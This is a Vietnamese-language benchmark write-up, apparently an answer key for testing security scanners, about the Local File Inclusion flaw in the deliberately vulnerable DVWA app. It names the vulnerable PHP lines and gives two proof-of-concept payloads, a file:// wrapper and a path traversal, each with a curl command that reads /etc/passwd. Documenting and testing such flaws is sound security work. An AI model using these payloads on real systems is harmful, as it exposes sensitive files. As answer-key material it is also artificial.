# DV-baseline

Tài liệu này (**"DV-Baseline"**) được xây dựng nhằm mục đích thiết lập một **"Ground Truth" (Sự thật nền)** chi tiết, có thể kiểm chứng và định lượng được cho ứng dụng Damn Vulnerable Web Application (DVWA).

Mục tiêu chính là cung cấp một bộ dữ liệu tham chiếu (*benchmark dataset*) chuẩn hóa để đo lường, so sánh và xác thực hiệu suất của các công cụ quét bảo mật ứng dụng động (DAST) và các giải pháp phân tích bảo mật tự động khác.  
Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:

- **Độ phủ (Coverage):** Khả năng phát hiện các lỗ hổng ở các mức độ phức tạp khác nhau (*Low, Medium, High*).

- **Độ chính xác (Accuracy):** Khả năng phân biệt giữa lỗ hổng thực sự (*True Positive*) và các báo động giả (*False Positive*) bằng cách phân tích cấp độ *"Impossible"*.  

- **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.

# Lỗ hổng: Local File Inclusion (LFI) - (OWASP A03:2021 - Injection)
## Phương pháp
Phân tích mã nguồn cho thấy một cơ chế `Whitelist (fnmatch("file*", ... ))` đã được triển khai nhưng bị lỗi, cho phép dữ liệu do người dùng include file tuỳ ý.

## Phân tích Dòng mã Lỗi (Vulnerable Code Line)
Lỗ hổng xảy ra do luồng dữ liệu không an toàn từ "Untrusted data" đến hàm gọi nguy hiểm

1. Nguồn (Source) - Nơi nhận dữ liệu không tin cậy:
* Vị trí: vulnerabilities/fi/index.php
* Code:
```
    $file = $_GET[ 'page' ];
```
* Mô tả: Biến `$file` nhận giá trị trực tiếp từ tham số 'page' của người dùng.

2. Nơi xử lý (Sink) - Nơi thực thi hàm nguy hiểm:
* Vị trí: vulnerabilities/fi/index.php
* Code:
```
    include( $file );
```
* Mô tả: Biến `$file` (hiện đang chứa payload) được truyền thẳng vào hàm include(). Hàm này sẽ thực thi hoặc hiển thị bất kỳ file nào được chỉ định, dẫn đến LFI.

## Kịch bản Khai thác (Proof of Concept - PoC)

### Kịch bản 1: Đọc tệp tin hệ thống qua PHP Wrapper
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file:///etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file:///etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Kịch bản 2: Đọc tệp tin hệ thống qua Path Traversal
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file/../../../../../../etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file/../../../../../../etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Screenshots
(Dán ảnh chụp màn hình của bạn vào đây)
